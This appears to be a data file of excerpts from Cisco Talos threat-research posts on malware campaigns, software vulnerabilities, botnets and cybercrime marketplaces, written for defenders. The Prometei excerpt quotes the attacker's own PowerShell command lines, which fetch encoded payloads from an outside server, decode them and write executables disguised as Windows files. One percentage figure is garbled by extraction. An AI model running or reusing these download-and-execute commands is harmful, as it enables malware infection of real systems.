the criminals as they are tasked with protecting the general public. The future criminal is going to be aware of operational security and technologies like Tor to make their arrests increasingly difficult. The time is now to start building the capabilities into police departments to be able to handle the shift that has already been happening for a decade but is poised to explode, as people have been locked away for several years during the pandemic. The question becomes - how did criminals make use of that time? ", "source": "Cisco"}, {"title": "Introduction", "content": "By Asheer Malhotra \nTUESDAY, MARCH 2, 2021 08:04 \nBy Asheer Malhotra. \nCisco Talos has observed another malware campaign that utilizes malicious Microsoft Office documents (maldocs) to spread the remote access trojan (RAT) ObliqueRAT.   \nThis campaign targets organizations in South Asia.   \nObliqueRAT has been linked to the Transparent Tribe APT group in the past.   \nThis campaign hides the ObliqueRAT payload in seemingly benign image files hosted on compromised websites. ", "source": "Cisco"}, {"title": "Conclusion", "content": "This campaign shows a threat actor evolving their infection techniques so that they no longer resemble those used previously. It is highly likely that these changes are in response to previous disclosures to achieve evasion for these new campaigns. The usage of compromised websites is another attempt at detection evasion. The adversaries have also introduced steganography as a way to hide the ObliqueRAT payloads in image files. This technique is novel to ObliqueRAT's distribution chain (not observed in the past). This new campaign distributing ObliqueRAT started in April 2020 and is still ongoing. This campaign also highlights that while network-based detection is important, it must be complemented with system behavior analysis and endpoint protections. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Asheer Malhotra \nTUESDAY, OCTOBER 19, 2021 20:00 \nCisco Talos recently discovered a threat actor using political and government-themed malicious domains to target entities in India and Afghanistan.   \nThese attacks use dcRAT and QuasarRAT for Windows delivered via malicious documents exploiting CVE-2017-11882 - a memory corruption vulnerability in Microsoft Office - and AndroidRAT to target mobile devices.   \nThe actor also uses a custom file enumerator and infector in their initial reconnaissance phase of the attack.   \nThe actor appears to be a lone wolf using a front company to run a crimeware campaign, possibly to establish initial footholds into high-value targets for future operations or monetary gain. \nWhat's new? \nCisco Talos has observed a new campaign targeting Afghanistan and India utilizing malicious RTF documents to deliver a variety of commodity malware to victims. The campaign consists of two phases: A reconnaissance phase that involves a custom file enumerator and infector to the victims and an attack phase that deploys a variety of commodity RATs, such as DcRAT and QuasarRAT. \nHow did it work? \nThe threat actor registered multiple domains with political and government themes. These domains hosted malware payloads that were distributed to their victims. Their malicious lures also contained themes related to Afghan entities, specifically diplomatic and humanitarian efforts. We assess with high confidence that the threat actor behind these attacks is an individual operating under the guise of a Pakistani IT firm called \"Bunse Technologies.\" \nThe infection chains consist of malicious RTF documents and PowerShell scripts that distribute malware to victims. We've also observed the usage of C#-based downloader binaries to deploy malware while displaying decoy images to victims to appear legitimate. \nSo what? \nThis campaign is a classic example of an individual threat actor employing political, humanitarian and diplomatic themes in a campaign to deliver commodity malware to victims. Commodity RAT families are increasingly being used by both crimeware and APT groups to infect their targets. These RATs are packed with multiple functionalities to achieve complete control over the victim's endpoint - from preliminary reconnaissance capabilities to arbitrary command execution and data exfiltration. These families also act as excellent launch pads for deploying additional malware against their victims. Furthermore, these out-of-the-box features enable the attackers to make minimal configuration changes to the RATs taking away the need for a full-fledged development cycle of custom malware by an actor. \nThe use of a custom file enumerator and infector module by the attackers indicates their intent to proliferate by infecting benign, trusted documents to achieve an even greater degree of infection. ", "source": "Cisco"}, {"title": "Conclusion", "content": "This threat actor, A.R., uses a front company to procure infrastructure for operationalizing their crimeware campaign. This campaign uses a variety of political and government-related themes in their icons and decoys. The infection chains utilized by the actor are simple and consist of delivering commodity RATs such as dcRAT, Quasar and AndroRAT to their victims. Their use of custom downloaders for delivery, file enumerators for reconnaissance, and infectors to weaponize benign documents indicates attempts at aggressive proliferation. These tools also indicate that the threat actor is actively pursuing creating bespoke tools to shift away from commodity malware. \nCommodity malware is extremely popular with malware operators these days. It allows the attackers to focus on operational aspects of their campaigns without having to put in effort into development of novel malware families. Coupled with small customized file infectors, generating straightforward infection chains enables an attacker to automate their proliferation efforts. Organizations should remain vigilant against such threats that are highly motivated to proliferate using automated mechanisms. \nCoverage \nWays our customers can detect and block this threat are listed below. \nCisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free here. \nCisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in these attacks. \nCisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign. You can try Secure Email for free here. \nCisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat Defense Virtual, Adaptive Security Appliance and Meraki MX can detect malicious activity associated with this threat. \nCisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products. \nUmbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella here. \nCisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites before users access them. \nAdditional protections with context to your specific environment and threat data are available from the Firewall Management Center. \nCisco Duo provides multi-factor authentication for users to ensure only those authorized are accessing your network. \nOpen-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. \nSnort SIDs detecting this threat are: 58356-58361. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Asheer Malhotra \nTHURSDAY, NOVEMBER 12, 2020 08:18 \nRAT THREAT SPOTLIGHT THREATS\nCisco Talos has observed a new version of a remote access trojan (RAT) family known as CRAT. \nApart from the prebuilt RAT capabilities, the malware can download and deploy additional malicious plugins on the infected endpoint.   \nOne of the plugins is a ransomware known as \"Hansom.\"   \nCRAT has been attributed to the Lazarus APT Group in the past.   \nThe RAT consists of multiple obfuscation techniques to hide strings, API names, command and control (C2) URLs and instrumental functions, along with static detection evasion. The attack also employs a multitude of anti-infection checks to evade sandbox based detection systems. \nWhat's new? \nCisco Talos has recently discovered a new version of the CRAT malware family. This version consists of multiple RAT capabilities, additional plugins and a variety of detection-evasion techniques. In the past, CRAT has been attributed to the Lazarus Group, the malicious threat actors behind multiple cyber campaigns, including attacks against the entertainment sector. \nIndicators and tactics, techniques and procedures (TTPs) discovered by this investigation resemble those of the Lazarus Group. ", "source": "Cisco"}, {"title": "Conclusion", "content": "This investigation illustrates the continued use and evolution of the CRAT implant. CRAT started out as a nascent RAT with limited capabilities, which evolved to introduce a wide variety of malicious capabilities including a full-fledged File Explorer. \nThe latest iteration of CRAT now has the capability to download and deploy arbitrary plugins on the infected endpoint. These plugins have capabilities ranging from spying to encrypting and holding the user's data hostage. The ransomware plugin in particular has the potential to cause extensive loss of services, time and money to affected organizations. \nThe continued evolution of loaders used to deploy CRAT also indicates that the attackers are actively developing novel ways of infecting their targets. The extensive use of obfuscation, patching and anti-infection techniques indicates that the attackers have taken great care towards evading detection systems. Thus, while static and network-based detection is important, it should be complimented with system behavior analysis and endpoint protections. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Earl Carter \nTUESDAY, JUNE 21, 2016 15:37 \nThese vulnerabilities were discovered by Yves Younan. \nPidgin is a universal chat client that is used on millions of systems worldwide. The Pidgin chat client enables you to communicate on multiple chat networks simultaneously. Talos has identified multiple vulnerabilities in the way Pidgin handles the MXit protocol. These vulnerabilities fall into the following four categories. \nInformation Leakage Denial Of Service Directory Traversal Buffer Overflow \nThe following vulnerabilities were identified (listed numerically by CVE): CVE-2016-2365 - Pidgin MXIT Markup Command Denial of Service Vulnerability CVE-2016-2366 - Pidgin MXIT Table Command Denial of Service Vulnerability CVE-2016-2367 - Pidgin MXIT Avatar Length Memory Disclosure Vulnerability \nCVE-2016-2368 - Pidgin MXIT g_snprintf Multiple Buffer Overflow Vulnerability CVE-2016-2369 - Pidgin MXIT CP SOCK REC TERM Denial of Service Vulnerability CVE-2016-2370 - Pidgin MXIT Custom Resource Denial of Service Vulnerability CVE-2016-2371 - Pidgin MXIT Extended Profiles Code Execution Vulnerability CVE-2016-2372 - Pidgin MXIT File Transfer Length Memory Disclosure Vulnerability CVE-2016-2373 - Pidgin MXIT Contact Mood Denial of Service Vulnerability CVE-2016-2374 - Pidgin MXIT MultiMX Message Code Execution Vulnerability CVE-2016-2375 - Pidgin MXIT Suggested Contacts Memory Disclosure Vulnerability CVE-2016-2376 - Pidgin MXIT read stage Ox3 Code Execution Vulnerability CVE-2016-2377 - Pidgin MXIT HTTP Content-Length Buffer Overflow Vulnerability CVE-2016-2378 - Pidgin MXIT get_utf8_string Code Execution Vulnerability CVE-2016-2380 - Pidgin MXIT mxit_convert_markup_tx Information Leak Vulnerability CVE-2016-4323 - Pidgin MXIT Splash Image Arbitrary File Overwrite Vulnerability ", "source": "Cisco"}, {"title": "Conclusion", "content": "Communicating quickly and efficiently using instant messaging software has made this software very popular. Consequently, attackers are constantly trying to find and exploit vulnerabilities in instant messaging applications because it gives them access to a large number of potential victims. Patching software is crucial to reducing the attack surface against these constant ongoing attacks. Many users do not patch regularly, which can provide an easy avenue that an attacker can use to gain access to a system. The Pidgin instant messaging client is installed on many systems and installing the latest updated version (2.11.0) is vital to protecting against the vulnerabilities identified by Talos. You can find the latest pidgin software releases here. ", "source": "Cisco"}, {"title": "Introduction", "content": "Every day, more industrial control systems (ICS) become vulnerable to cyber attacks. As these massive, critical machines become more interconnected to networks, it increases the ways in which attackers could disrupt their operations and makes it tougher for those who protect organizations' networks to cover all possible attack vectors. To demonstrate how these ICSs interact with a network, we are releasing a model of a 3-D printed oil pumpjack connected to a simulated programmable logic controller (PLC) supporting two industrial protocols. Throughout the year, Talos will have this model at several workshops where attendees can try it out for themselves. For convenience, we are also providing the blueprints and code to even test this out for yourself at home. \nWe are releasing the 3-D printed model of the pumpjack, the Arduino source code (including the Modbus over TCP and the EtherNet/IP protocols), as well as the code for the human-machine interface (HMI) to control the pump over a network. \nTo show how serious of a problem it could be if an attacker were to gain control of this device in the real world, here's a GIF that shows how the pump reacts when the motor speed is increased beyond its natural pace. ", "source": "Cisco"}, {"title": "Conclusion", "content": "We hope these materials help researchers better understand industrial protocols, more particularly Modbus over TCP and EtherNet/IP. These two protocols are unauthenticated protocols always used in production. In the examples, we saw how to modify the internal value of a PLC (simulated by the Arduino UNO). But the PLC programming is performed by this protocol, too. On a real PLC, we can use the same protocol to program it, replace the original code, or patch it. For more information about a real-life PLC attack, we recommend our whitepaper \"Process Control through counterfeit comms: Using and abusing built-in functionality to own a PLC,\" which is available here. \nWe decided to publicly release our project to make it accessible to the largest audience possible. Do not hesitate to contribute to this project by adding features to the implemented protocols or adding new ones. We would be happy to handle pull requests on our GitHub. \nRELATED CONTENT \n\"There is no business school class that would ever sit down and design Talos\" J U LY 3 1 , 2 0 2 4 0 7 : 5 5 \nWe look back on 10 years of Talos, in multiple interviews with Talos' leaders. \nA (somewhat) complete timeline of Talos' history J U LY 2 4 , 2 0 2 4 0 6 : 0 0 \nRelive some of the major cybersecurity incidents and events that have shaped Talos over the past 10 years. \nBadgerboard: A PLC backplane network visibility module M A R C H 5 , 2 0 2 4 1 5 : 3 0 \nAnalysis of the traffic between networked devices has always been of interest since devices could even communicate with one another.  As the complexity of networks grew, the more useful dedicated traffic analysis tools became. Major advancements have been made over the years with tools like Snort or Wireshark, but these \nINTELLIGENCE CENTER Intelligence Search Email & Spam Trends \nVULNERABILITY RESEARCH Vulnerability Reports Microsoft Advisories \nINCIDENT RESPONSE Reactive Services Proactive Services Emergency Support \nWhat you can learn from Cisco Talos' new oil pumpjack workshop ", "source": "Cisco"}, {"title": "Introduction", "content": "By Edmund Brumaghin \nTUESDAY, SEPTEMBER 27, 2016 10:26 \nThis blog was authored by Ben Baker, Edmund Brumaghin and Jonah Samost. \nExecutive Summary \nGozNym is the combination of features from two previously identified families of malware, Gozi and Nymaim. Gozi was a widely distributed banking trojan with a known Domain Generation \nhttps://blog.talosintelligence.com/goznym/ \nAlgorithm (DGA) and also contained the ability to install a Master Boot Record (MBR) rootkit. Nymaim emerged in 2013 as malware which was used to deliver ransomware and was previously distributed by the Black Hole exploit kit. The code had various anti-analysis techniques, such as the obfuscation of Win32 API calls. \nThere have been multiple instances in which the source code of the Gozi trojan has been leaked. Due to these leaks it was possible for the GozNym authors to make use of the 'best of breed' methodologies incorporated into Gozi and create a significantly more robust piece of malware which was now capable of utilizing strengthened persistence methods and ultimately becoming a powerful banking trojan. \nGiven the recent success of the GozNym trojan and the number of targeted attacks seeking to infect victims with this malware, Talos decided to take a deep look at the inner workings of this particular malware family. Talos started by examining the binaries associated with GozNym as well as the distribution mechanisms. Additionally, we were able to successfully reverse engineer the DGA associated with a GozNym command and control (C2) infrastructure and sinkhole that botnet. This gave Talos great visibility into the size and scope of this threat and the number of infected systems beaconing to C2 servers under adversarial control. ", "source": "Cisco"}, {"title": "Conclusion", "content": "As can be seen from the characteristics associated with the spam campaigns used to distribute GozNym to potential victims, a good deal of effort was spent determining who to target within organizations and spear phishing was used in an effort to evade detection and avoid alerting administrators. Additionally, the anti-analysis and evasion techniques employed by the malware indicate that the malware authors were concerned with making analysis by security analysts more difficult and time consuming. Spear phishing attacks continue to be used by threat actors attempting to infect organizations. This is likely due to the continued success of these types of attacks. GozNym highlights the dangers of phishing campaigns and the importance of ensuring that organizations are protected from these types of threats. As shown by our analysis, GozNym is a constantly evolving threat that will likely continue to morph moving forward as attackers seek to add additional features and improve upon the ones currently present within the trojan. \nTalos is also releasing the following scripts that can be used to perform analysis of GozNym samples: \nDGA_release.py which simulates the DGA used by GozNym. Extract_parameters_from_http_post.py which extracts parameters from the HTTP POST requests that are sent to C2 servers.   \nDecrypt_response.py which allows for a decryption of the response payload. These tools are available in the Talos Github repository located here. ", "source": "Cisco"}, {"title": "Introduction", "content": "Cisco Talos has observed a malware campaign that utilizes military-themed malicious Microsoft Office documents (maldocs) to spread Cobalt Strike beacons containing full-fledged RAT capabilities.   \nThese maldocs use malicious macros to deliver a multistage and highly modular infection.   \nThis campaign appears to target military and government organizations in South Asia. Network-based detection, although important, should be combined with endpoint protections to combat this threat and provide multiple layers of security. ", "source": "Cisco"}, {"title": "Conclusion", "content": "This investigation illustrates an attacker using multiple tools and techniques to implement their full attack chain. A variety of infection artifacts are utilized ranging from bespoke tools (IndigoDrop) to customizable adversarial tools (Cobalt Strike beacons). The attackers also use a combination of public and private servers to host their malicious payloads with a growing trend towards the sole usage of public servers. \nThe use of military-themed maldocs (lures) indicates that government and military organizations in South Asia may be the targets of this threat actor. The maldocs contain bonafide content and are most likely weaponized copies of benign documents known to peek the interests of their targets. \nThe attack variants discovered over time show us that the threat actor can evolve their TTPs in a short period of time. The earliest observable campaigns of this actor date back to April 2018 and continue to operate today along with the most recent evolutions of the attacks. Evidence of rapid ideation, testing and production of new and diversified modules and IndigoDrop iterations indicates highly motivated and agile adversaries. The use of adversarial frameworks like Cobalt Strike suggests that the attackers are looking to expand their malicious arsenal at a significant rate with self-authored and customizable artifacts. \nModern-day malware attack chains consist of multiple stages and operational entities. These artifacts and entities may be hosted locally or on remote servers. For example, this attack consists of multiple shellcodes hosted on remote locations downloaded by a local component (IndigoDrop) during runtime to instrument the attack chain. Thus, while network-based detection is important, it should be complemented with system behavior analysis and endpoint protections. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Edmund Brumaghin \nTHURSDAY, MARCH 2, 2017 12:11 \nThis post was authored by Edmund Brumaghin and Colin Grady \nExecutive Summary \nThe Domain Name System (DNS) is one of the most commonly used Internet application protocols on corporate networks. It is responsible for providing name resolution so that network resources can be accessed by name, rather than requiring users to memorize IP addresses. While many organizations implement strict egress filtering as it pertains to web traffic, firewall rules, etc. many have less stringent controls in place to protect against DNS based threats. Attackers have recognized this and commonly encapsulate different network protocols within DNS to evade security devices. \nTypically this use of DNS is related to the exfiltration of information. Talos recently analyzed an interesting malware sample that made use of DNS TXT record queries and responses to create a bidirectional Command and Control (C2) channel. This allows the attacker to use DNS communications to submit new commands to be run on infected machines and return the results of the command execution to the attacker. This is an extremely uncommon and evasive way of administering a RAT. The use of multiple stages of Powershell with various stages being completely fileless indicates an attacker who has taken significant measures to avoid detection. \nIronically, the author of the malware called SourceFire out in the malware code itself shortly after we released Cisco Umbrella, a security product specifically designed to protect organizations from DNS and web based threats as described here. ", "source": "Cisco"}, {"title": "Conclusion", "content": "This malware sample is a great example of the length attackers are willing to go to stay undetected while operating within the environments that they are targeting. It also illustrates the importance that in addition to inspecting and filtering network protocols such as HTTP/HTTPS, SMTP/POP3, etc. DNS traffic within corporate networks should also be considered a channel that an attacker can use to implement a fully functional, bidirectional C2 infrastructure. Cisco Umbrella is a product that can be used specifically for this purpose. In addition to stopping this particular attack, DNS monitoring and filtering can also disrupt a large portion of overall malware infections, as the over $\\textcircled{=}\\textcircled{=}\\textcircled{=}$ of malware makes use of the DNS network protocol at some stage of the infection or post-infection process. ", "source": "Cisco"}, {"title": "Introduction", "content": "We are used to ransomware attacks and big-game hunting making the headlines, but there are still methods adversaries use to monetize their efforts in less intrusive ways. Cisco Talos recently discovered a cryptocurrency-mining botnet attack we're calling \"Prometei\" using several techniques that defenders are likely to spot, but are not immediately obvious to end-users. \nThese threats demonstrate several techniques of the MITRE ATT&CK framework, most notably T1089 (Disabling Security Tools), T1105 (Remote File Copy), T1027 (Obfuscated Files or Information), T1086 (PowerShell), T1035 (Service Execution), T1036 (Masquerading) and T1090 (Connection Proxy). \nAttackers are constantly reinventing ways of monetizing their tools. Cisco Talos recently discovered a complex campaign employing a multi-modular botnet with multiple ways to spread and a payload focused on providing financial benefits for the attacker by mining the Monero online currency. The actor employs various methods to spread across the network, like SMB with stolen credentials, psexec, WMI and SMB exploits. The adversary also uses several crafted tools that helps the botnet increase the amount of systems participating in its Monero-mining pool. ", "source": "Cisco"}, {"title": "Introduction", "content": "This botnet was discovered by investigating telemetry information coming to Talos from Cisco AMP for Endpoints' install base. We regularly conduct hunting sessions to find new malware that may be running under the radar. Rules and command lines are one of the best starting points for hunting. \nPowerShell drove the first command line we discovered: \npowershell.exe   \"if(-not (Test-Path 'C:\\windows\\dell\\miwalk.exe')) {\\$b64=\\$(NewObject   \nNet.WebClient).DownloadString('http://69.84.240[.]57:180/miwalk.txt');\\$data= [System.Convert]::FromBase64String(\\$b64);\\$bt=New-Object Byte[](\\$data.Length); [int]\\$j=0;FOR([int]\\$i=0;\\$i -lt \\$data.Length; \\$i++){\\$j+=66;\\$bt[\\$i]=((((\\$data[\\$i]) bXOR ((\\$i\\*3) -band 0xFF))-\\$j) -band 0xFF);}   \n[io.file]::WriteAllBytes('C:\\windows\\dell\\miwalk.exe',\\$bt);}\" \nFrom then on, we started discovery by traversing the process parent-child graph and coming up to the parent module svchost.exe, which was run from an unusual path in the C:\\Windows, rather than <Windows\\System32> folder. \nA search through the events for the C:\\windows\\svchost.exe and the downloaded IP address brings us to an even more interesting call - broken into individual commands for readability: \nC:\\Windows\\System32\\cmd.exe /C taskkill -f -im rdpcIip.exe del C:\\windows\\dell\\rdpcIip.exe \npowershell.exe if(-not (Test-Path 'C:\\windows\\dell\\miwalk.exe')) {\\$b64=\\$(NewObject   \nNet.WebClient).DownloadString('http://69.84.240[.]57:180/miwalk.txt');\\$data= [System.Convert]::FromBase64String(\\$b64);\\$bt=New-Object Byte[](\\$data.Length); [int]\\$j=0;FOR([int]\\$i=0;\\$i -lt \\$data.Length; \\$i++){\\$j+=66;\\$bt[\\$i]=((((\\$data[\\$i]) bXOR ((\\$i\\*3) -band 0xFF))-\\$j) -band 0xFF);}   \n[io.file]::WriteAllBytes('C:\\windows\\dell\\miwalk.exe',\\$bt);} \npowershell.exe if(-not (Test-Path 'C:\\windows\\dell\\rdpcIip.exe')) {\\$b64=\\$(NewObject \nNet.WebClient).DownloadString('http://69.84.240[.]57:180/walker14364.php');\\$data= [System.Convert]::FromBase64String(\\$b64);\\$bt=New-Object Byte[](\\$data.Length); [int]\\$j=0;FOR([int]\\$i=0;\\$i -lt \\$data.Length; \\$i++){\\$j+=66;\\$bt[\\$i]=((((\\$data[\\$i]) bXOR ((\\$i\\*3) -band 0xFF))-\\$j) -band 0xFF);} [io.file]::WriteAllBytes('C:\\windows\\dell\\rdpcIip.exe',\\$bt);} \nC:\\Windows\\svchost.exe /sha1chk 58899ed72b617c7e89455d55f5663f44d7eb24d8 C:\\windows\\dell\\miwalk.exe \nC:\\Windows\\svchost.exe /sha1chk e5ffb2a8ceb70e7280fb5ac9f8acac389ed0181e C:\\windows\\dell\\rdpcIip.exe \nImmediately, we see that svchost has multiple functions. Apart from being the parent process of the PowerShell invocation that downloads additional components, it is also executed with the /sha1chk option. This indicates that it may also contain integrity checking functionality for downloaded modules. \nTwo modules are downloaded and one of them launched rdpcIip,exe - with its file name modified so it looks like the legitimate Windows executable rdpclip.exe. Finally, rdpcIip is launched with two arguments that look like they could be an administrator's user credentials. \nOver a period of more than two months, we followed the activity of this botnet and found more than 15 different modules organized in two main functional branches. Both branches can function fairly independently, which may indicate that we are dealing with another actor piggybacking on the main botnet functionality and using it to spread their own modules. \nThe adversaries developed the first branch in C++ and uses a special type of obfuscation to evade analysis and detection in dynamic automated analysis systems. Its main modules - svchost, miwalk, rdpcIip and SearchIndexer - are clearly made to work together. \nTwo main branches of the Prometei (Prometheus) botnet. \nHowever, it is more likely we are dealing with the same author, as the second branch is distributed through the same download server and it is downloaded by the main bot svchost.exe. However, the second branch deals mainly with attempting to brute-force the combination of usernames and passwords using SMB and RDP protocols and it is developed using .NET framework combined with free tools and modified open-source software. \nThe second branch main module nvsync.exe, which communicates with its own C2, contains some indication that its purpose is cryptocurrency mining, but we have not found evidence of that. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Despite their activities being visible in logs, some botnets successfully fly under detection teams' radar, possibly due to their small size or constant development on the adversary's part. Prometei is just one of these types of networks that focuses on Monero mining. It has been successful in keeping its computing power constant over the three months we've been tracking it. \nThe botnet was active as early as the beginning of March, but it seems to have been dealt a blow by a takeover of one of its C2 servers on June 8. But this takeover didn't stop its mining capabilities or the validation of stolen credentials. The botnet continues to make a moderate profit for a single developer, most likely based in Eastern Europe. \nThe actor behind it is also likely its developer. The TTPs indicate we may be dealing with a professional developer, based on their ability to integrate SMB exploits such as Eternal Blue and authentication code and the use of existing open-source projects, such as Mimikatz and FreeRDP. \nApart from stealing computing power, the botnets behaviour of stealing and validating credentials is worrying. Although we only saw evidence of stolen credentials being used to spread laterally, they also have a value on underground markets and the damage potential of losing important administrative username and password is very high. This is why organizations that detect the presence of Prometei botnet on their system should act immediately to remove it and to make sure none of their credentials are leaked to the command and control server. \nCoverage \nWays our customers can detect and block this threat are listed below. \nAdvanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors. Exploit Prevention present within AMP is designed to protect customers from unknown attacks such as this automatically. \nCisco Cloud Web Security (CWS) orWeb Security Appliance (WSA) web scanning prevents access to malicious websites and detects malware used in these attacks. \nEmail Security can block malicious emails sent by threat actors as part of their campaign. \nNetwork Security appliances such as Next-Generation Firewall (NGFW), Next-Generation Intrusion Prevention System (NGIPS),Cisco ISR, andMeraki MX can detect malicious activity associated with this threat. \nAMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products. \nUmbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network. \nOpen Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase onSnort.org. \nIOCs ", "source": "Cisco"}, {"title": "Introduction", "content": "By Jaeson Schultz \nFRIDAY, APRIL 5, 2019 09:00 \nCisco Talos is continually working to ensure that our threat intelligence not only accounts for the latest threats but also new versions of old threats, such as spam. This often means pursuing cybercriminals wherever they congregate. However, instead of wheeling-and-dealing using hidden servers on some mysterious dark web address, a surprisingly large number of cyber scofflaws prefer to operate right out in the open using social media. For example, Facebook is host to \ndozens of groups that serve as online marketplaces and exchanges for cybercriminals. Talos saw spam from services advertised in these Facebook groups show up in our own telemetry data, indicating a potential impact to Cisco customers from these groups. \nOver the past several months, Cisco Talos has tracked several groups on Facebook where shady (at best) and illegal (at worst) activities frequently take place. The majority of these groups use fairly obvious group names, including \"Spam Professional,\" \"Spammer & Hacker Professional,\" \"Buy Cvv On THIS SHOP PAYMENT BY BTC \ud83d\udcb0\ud83d\udcb5,\" and \"Facebook hack (Phishing).\" Despite the fairly obvious names, some of these groups have managed to remain on Facebook for up to eight years, and in the process acquire tens of thousands of group members. \nIn all, Talos has compiled a list of 74 groups on Facebook whose members promised to carry out an array of questionable cyber dirty deeds, including the selling and trading of stolen bank/credit card information, the theft and sale of account credentials from a variety of sites, and email spamming tools and services. In total, these groups had approximately 385,000 members. \nThese Facebook groups are quite easy to locate for anyone possessing a Facebook account. A simple search for groups containing keywords such as \"spam,\" \"carding,\" or \"CVV\" will typically return multiple results. Of course, once one or more of these groups has been joined, Facebook's own algorithms will often suggest similar groups, making new criminal hangouts even easier to find. Facebook seems to rely on users to report these groups for illegal and illicit activities to curb any abuse. \nTalos initially attempted to take down these groups individually through Facebook's abuse reporting functionality. While some groups were removed immediately, other groups only had specific posts removed. Eventually, through contact with Facebook's security team, the majority of malicious groups was quickly taken down, however new groups continue to pop up, and some are still active as of the date of publishing. Talos continues to cooperate with Facebook to identify and take down as many of these groups as possible. \nThis is not a new problem for Facebook. In April 2018, security reporter Brian Krebs alerted the social media site to dozens of Facebook groups wherein hackers routinely offered a variety of services including carding (the theft of credit card information), wire fraud, tax refund fraud and distributed denial-of-service (DDoS) attacks. Months later, though the specific groups identified by Krebs had been permanently disabled, Talos discovered a new set of groups, some having names remarkably similar, if not identical, to the groups reported on by Krebs. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Social media has provided tools enabling individuals from all over the globe to congregate and share ideas. This is one of social media's defining features. However, the underlying computer algorithms that help us connect, suggesting new friends or networks, are not intelligent enough to distinguish benign activities from unethical or outright illegal. So far, Facebook has apparently relied on these communities to police themselves, which for obvious reasons, these criminal communities are reticent to do. As a consequence of this, a substantial number of cyberscammers have continued to proliferate and profit from illegal activities. Operating with impunity, these attackers relentlessly probe cyber-defenses of enterprises everywhere. This is a high-stakes endeavor because an attacker with even the smallest foothold inside an organization can do considerable damage. \nTo combat these motivated adversaries, we need to work together. Social media platforms should continue their efforts, both manual and automated, aimed at identifying and removing malicious groups. Security teams and vendors must work together to actively share information, take action and inform our customers. Businesses need to be diligent about their protection and cyber hygiene efforts. And finally, consumers need to become as informed and skeptical as possible. Attacks like spam prey on the individual as an entry point. \nNote: If users encounter malicious groups on Facebook, they can always report the groups through Facebook's \"report\" function, which is located at the top of the group's page in the drop-down menu under the \"... More\" button. \nSHARE THIS POST ", "source": "Cisco"}, {"title": "Introduction", "content": "In March 2017, Microsoft released a security update for various versions of Windows, which addressed a remote code execution vulnerability affecting a protocol called SMBv1 (MS17-010). As this vulnerability could allow a remote attacker to completely compromise an affected system, the vulnerability was rated \"Critical\" with organizations being advised to implement the security update. Additionally, Microsoft released workaround guidance for removing this vulnerability in environments that were unable to apply the security update directly. At the same time, Cisco released coverage to ensure that customers remained protected. \nThe following month, April 2017, a group publishing under the moniker \"TheShadowBrokers\" publicly released several exploits on the internet. These exploits targeted various vulnerabilities including those that were addressed by MS17-010 a month earlier. As is always the case, \nwhenever new exploit code is released into the wild, it becomes a focus of research for both the information security industry as well as cybercriminals. While the good guys take information and use it for the greater good by improving security, cybercriminals also take the code and attempt to find ways to leverage it to achieve their objectives, whether that be financial gain, to create disruption, etc. ", "source": "Cisco"}, {"title": "Conclusion", "content": "WannaCry and Nyetya are two examples of events that resulted in many organizations around the world being significantly impacted by malware. These events underscore the need to get back to the basics from an information security perspective to ensure that organizations are adequately protected and ready to respond to disruptive events that may occur within their environments. Computer worms are nothing new, they have been around for decades. Having a sound, layered, defense-in-depth strategy in place will ensure that organizations can prevent widespread system outages, and detect and respond when system compromise occurs within their environments to minimize the impact these events may have. \nThe National Institute of Standards and Technology (NIST) has released Special Publication 800- 53 \"Security and Privacy Controls for Federal Information Systems and Organizations\" which provides comprehensive guidance regarding recommended best practices and the selection of security controls that can be implemented to establish a sound defensive architecture within networked environments. This guidance is available here. \nRELATED CONTENT \nIntroducing ToyMaker, an initial access broker working in cahoots with double extortion gangs \nA P R I L 2 3 , 2 0 2 5 0 6 : 0 0 \nCisco Talos discovered a sophisticated attack on critical infrastructure by ToyMaker and Cactus, using the LAGTOY backdoor to orchestrate a relentless double extortion scheme. \nUnwrapping the emerging Interlock ransomware attack \nN OV E M B E R 7 , 2 0 2 4 0 6 : 0 0 \nCisco Talos Incident Response (Talos IR) recently observed an attacker conducting big-game hunting and double extortion attacks using the relatively new Interlock ransomware. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Nick Biasini, Edmund Brumaghin, Chris Neal, Paul Eubanks \nWEDNESDAY, APRIL 7, 2021 08:06\nAs telework has become the norm throughout the COVID-19 pandemic, attackers are modifying their tactics to take advantage of the changes to employee workflows. \nAttackers are leveraging collaboration platforms, such as Discord and Slack, to stay under the radar and evade organizational defenses. Collaboration platforms enable adversaries to conduct campaigns using legitimate infrastructure that may not be blocked in many network environments.   \nRATs, information stealers, internet-of-things malware and other threats are leveraging collaboration platforms for delivery, component retrieval and command and control communications. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Malicious threat actors are always trying to find new and effective ways to get malware executing on systems and one of the biggest challenges is distribution. As chat apps like Discord, Slack and many others rise in popularity, organizations need to assess how these applications can be abused by adversaries and how many of them should be allowed to operate inside your enterprise. As we've shown repeatedly in this blog, these types of applications require content delivery networks (CDNs) to ensure their content is available to people everywhere and malicious actors have noticed. It's likely the abuse of these chat apps will only increase in the near and long term. As more applications become available and some rise and fall in popularity, new avenues will continually be opened for adversaries. \nAs defenders, we need to decide what chat applications are allowed and why, while clearly communicating to management the risk associated with each. If you don't use a chat app internally for business purposes, it may be worth considering blocking some of the domains that can be abused for content delivery or putting other mitigations in place to help reduce the risk. We've continually seen adversaries evolve from including attachments directly in email, to hosting it on 